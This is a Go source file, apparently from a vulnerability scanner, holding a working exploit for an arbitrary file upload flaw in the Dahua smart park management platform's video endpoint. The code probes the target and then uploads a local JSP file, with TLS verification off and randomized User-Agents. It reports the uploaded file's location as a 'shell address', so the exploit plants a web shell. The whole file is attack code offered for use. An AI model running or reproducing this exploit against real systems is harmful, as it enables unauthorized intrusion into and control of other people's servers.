package poc

import (
	"PocSir/common"
	"bytes"
	"crypto/tls"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func DaHua_Video_Upload(target string) {
	pocUrl := target + "/publishing/publishing/material/file/video"

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}
	//创建缓冲区
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	headers := map[string]string{
		"User-Agent":   getRandUa(),
		"Content-Type": writer.FormDataContentType(),
	}
	//创建文件表单字段
	file, err := writer.CreateFormFile("Filedata", "Test.jsp")
	if err != nil {
		common.ErrMsg.Println(err)
		return
	}

	open, err := os.Open("test.jsp")
	if err != nil {
		common.ErrMsg.Printf("[-]%v\n", err)
		return
	}
	defer open.Close()

	io.Copy(file, open)
	writer.WriteField("Submit", "submit")
	err = writer.Close()
	if err != nil {
		common.ErrMsg.Println(err)
		return
	}

	req1, err := http.NewRequest("GET", pocUrl, nil)
	if err != nil {
		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}

	for key, value := range headers {
		req1.Header.Set(key, value)
	}
	resp1, err := client.Do(req1)
	if err != nil {
		common.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp1.Body.Close()
	if resp1.StatusCode == http.StatusMethodNotAllowed {
		common.Right.Printf("[+]%s 存在大华 智慧园区综合管理平台video任意文件上传漏洞\n", target)
		request, err := http.NewRequest("POST", pocUrl, body)
		if err != nil {
			common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
			return
		}
		for key, value := range headers {
			request.Header.Set(key, value)
		}
		resp, err := client.Do(request)
		if err != nil {
			common.ErrMsg.Printf("[-]%s is timeout\n", target)
			return
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		if resp.StatusCode == http.StatusOK && strings.Contains(string(data), "success") {
			// 创建正则表达式来匹配JSON键值对中的"path"
			regex := `\"path\"\s*:\s*\"([^\"]+)\"`

			// 编译正则表达式
			re := regexp.MustCompile(regex)

			// 在字符串中查找匹配项
			match := re.FindStringSubmatch(string(data))

			if len(match) == 2 {
				// 提取匹配到的"path"值
				pathValue := match[1]
				common.Right.Printf("[+]shell地址: %s\n", target+"/publishingImg/"+pathValue)
			} else {
				common.ErrMsg.Printf("[-]未找到path地址,请手工尝试\n")
			}
		}
	} else {
		common.Right.Printf("[-]%s不存在大华智慧园区综合管理平台video任意文件上传漏洞\n", target)
	}

}
